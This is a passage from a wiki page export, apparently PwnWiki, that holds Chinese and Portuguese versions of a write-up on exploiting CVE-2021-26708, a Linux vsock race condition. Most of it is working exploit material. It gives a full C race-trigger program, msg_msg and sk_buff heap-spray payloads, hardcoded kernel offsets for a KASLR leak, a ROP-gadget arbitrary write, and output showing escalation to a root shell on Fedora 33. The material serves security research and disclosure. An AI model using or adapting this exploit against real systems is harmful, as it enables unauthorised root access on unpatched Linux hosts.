               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/div&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
===任意讀的步驟===
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/div&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/div&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/div&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==尋找攻擊目標==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面是該漏洞如何從內存中提取這些指針:
&lt;/div&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
我構建了以下步驟：
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
4.對vsock_sock執行任意讀取過程
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
6.對這個可能的sk_buff地址執行任意讀
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
9.對sk_buff內核地址進行任意釋放
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
11.使用recv()接收服務器套接字的網絡消息。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==通過skb_shared_info 進行任意寫==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/div&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/div&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
下面講講destructor_arg 回調:
&lt;/div&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/div&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==視頻==
&lt;/div&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>3jg4gb46jf481866lhjw8zddl30g7en</sha1>
    </revision>
    <revision>
      <id>2579</id>
      <parentid>2502</parentid>
      <timestamp>2021-05-06T01:50:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "O fuzzer syzkaller não tem como reproduzir este travamento, então decidi estudá-lo sozinho. Mas por que o fuzzer falha? Observe &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; e..."</comment>
      <origin>2579</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="26431" sha1="9mqntzrtkmzj8yzkydmtq9zick2cy7j" xml:space="preserve">&lt;languages  /&gt;
== Vulnerabilidade ==

Essas vulnerabilidades são condições de corrida causadas pelo bloqueio incorreto em &lt;code&gt; net / vmw_vsock / af_vsock.c &lt;/code&gt;. Essas competições condicionais foram introduzidas implicitamente no envio que adicionou o suporte a multitransporte VSOCK em novembro de 2019 e foram incorporadas à versão do kernel Linux 5.5-rc1.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; e &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; são fornecidos como módulos do kernel em todas as principais distribuições GNU / Linux. Quando você cria um soquete para o domínio AF_VSOCK, esses módulos vulneráveis ​​são carregados automaticamente.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

A criação de sockets &lt;code&gt; AF_VSOCK &lt;/code&gt; está disponível para usuários não privilegiados e não requer espaço de nome de usuário.


== Corrupção de memória ==

A seguir está uma introdução detalhada ao uso de CVE-2021-26708, usando a competição condicional em &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Dois threads são necessários para reproduzir. O primeiro thread chama &lt;code&gt; setsockopt () &lt;/code&gt;:
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



O segundo thread muda a transmissão do soquete virtual quando &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; tenta adquirir o bloqueio do soquete, reconectando o soquete virtual:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Para processar o &lt;code&gt; connect () &lt;/code&gt; do socket virtual, o kernel executa &lt;code&gt; vsock_stream_connect () &lt;/code&gt; que chama &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Esta função contém o seguinte código:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt; vsock_stream_connect () &lt;/code&gt; contém um bloqueio de soquete, e &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; na thread paralela também tenta obtê-lo, o que constitui uma competição condicional. Portanto, quando o segundo &lt;code&gt; connect () &lt;/code&gt; é executado com um &lt;code&gt; svm_cid &lt;/code&gt; diferente, a função &lt;code&gt; vsock_deassign_transport () &lt;/code&gt; é chamada. Esta função executa &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;, libera &lt;code&gt; vsock_sock.trans &lt;/code&gt; e &lt;code&gt; vsk-&gt; transport &lt;/code&gt; é definido como NULL. Quando &lt;code&gt; vsock_stream_connect () &lt;/code&gt; libera o bloqueio de soquete, &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; pode continuar a executar. Ele chama &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; e, em seguida, chama &lt;code&gt; transport-&gt; notification_buffer_size () &lt;/code&gt;. Aqui, transporte contém um valor desatualizado de uma variável local, que não corresponde a &lt;code&gt; vsk-&gt; transporte &lt;/code&gt; (o valor original é definido como NULL).

Quando o kernel executa &lt;code&gt; virtio_transport_notify_buffer_size () &lt;/code&gt;, ocorre corrupção de memória:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Aqui, vvs é um ponteiro para a memória do kernel, que foi lançado em &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;. O tamanho de &lt;code&gt; struct virtio_vsock_sock &lt;/code&gt; é de 64 bytes e está localizado no cache de bloco kmalloc-64. O tipo de campo buf_alloc é u32 e está localizado no deslocamento 40. &lt;code&gt; VIRTIO_VSOCK_MAX_BUF_SIZE é 0xFFFFFFFFUL &lt;/code&gt;. O valor de * val é controlado pelo invasor e seus quatro bytes menos importantes são gravados na memória liberada.


== Fuzzing ==

O fuzzer syzkaller não tem como reproduzir este travamento, então decidi estudá-lo sozinho. Mas por que o fuzzer falha? Observe &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; e descubra:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Somente quando val for diferente do buffer_size atual, &lt;code&gt; notification_buffer_size () &lt;/code&gt; será chamado, ou seja, quando &lt;code&gt; setsockopt () &lt;/code&gt; executar &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, todas as vezes Os parâmetros de tamanho da chamada devem ser todos diferentes. Então, criei o código relevante:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

O valor do tamanho aqui é obtido do número de nanossegundos retornado por &lt;code&gt; clock_gettime () &lt;/code&gt;, que pode ser diferente a cada vez. O syzkaller original não faz isso, porque quando o syzkaller gera a entrada de difusão, o valor do parâmetro syscall é determinado e não muda durante a execução.

== O poder de quatro bytes ==

Aqui eu escolho o Fedora 33 Server como alvo de pesquisa, a versão do kernel é 5.10.11-200.fc33.x86_64, e estou determinado a ignorar SMEP e SMAP.

Na primeira etapa, comecei a estudar a pulverização de heap estável, que explorava a execução de atividades do espaço do usuário para fazer com que o kernel alocasse outro objeto de 64 bytes no local do virtio_vsock_sock liberado. Após várias tentativas experimentais, foi confirmado que o virtio_vsock_sock liberado foi sobrescrito, indicando que a pulverização de heap é viável. Finalmente encontrei msgsnd () syscall. Ele cria struct msg_msg no espaço do kernel, consulte a saída do pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

A frente é o cabeçalho da mensagem e o verso são os dados da mensagem. Se o struct msgbuf no espaço do usuário tiver um mtext de 16 bytes, o msg_msg correspondente será criado no cache de bloco kmalloc-64. Um write-after-free de 4 bytes destruirá o ponteiro de segurança void * no deslocamento 40. O campo msg_msg.security aponta para os dados do kernel alocados por lsm_msg_msg_alloc (). Quando msg_msg for recebido, ele será liberado por security_msg_msg_free (). Portanto, destruindo a primeira metade do indicador de segurança, um free arbitrário pode ser obtido.

== Vazamento de informações do kernel ==

Aqui é usado [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D % 87% E6% BC% 8F% E6% B4% 9E CVE-2019-18683] a mesma técnica. O segundo connect () do socket virtual chama &lt;code&gt; vsock_deassign_transport () &lt;/code&gt; e define &lt;code&gt; vsk-&gt; transport &lt;/code&gt; como NULL, tornando &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Chamando &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; após a falha de memória, um aviso de kernel aparece:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
Por meio da depuração do gdb, verifica-se que o registro RCX contém o endereço do kernel do virtio_vsock_sock liberado, e o registro RBX contém o endereço do kernel do vsock_sock.

== Obtenha uma leitura arbitrária ==

=== De arbitrário gratuito para uso após livre ===

Libere um objeto do endereço do kernel vazado
Execute heap spray e cubra o objeto com dados controlados
Use objetos danificados para escalonamento de privilégios
A mensagem System V implementada pelo kernel tem um limite máximo de DATALEN_MSG, ou seja, PAGE_SIZE menos sizeof (struct msg_msg)). Se você enviar uma mensagem maior, as mensagens restantes serão salvas na lista de segmentos de mensagem. O msg_msg contém struct msg_msgseg * próximo para apontar para o primeiro segmento, e size_t m_ts é usado para armazenar o tamanho. Ao realizar uma operação de substituição, você pode colocar o valor controlado em msg_msg.m_ts e msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
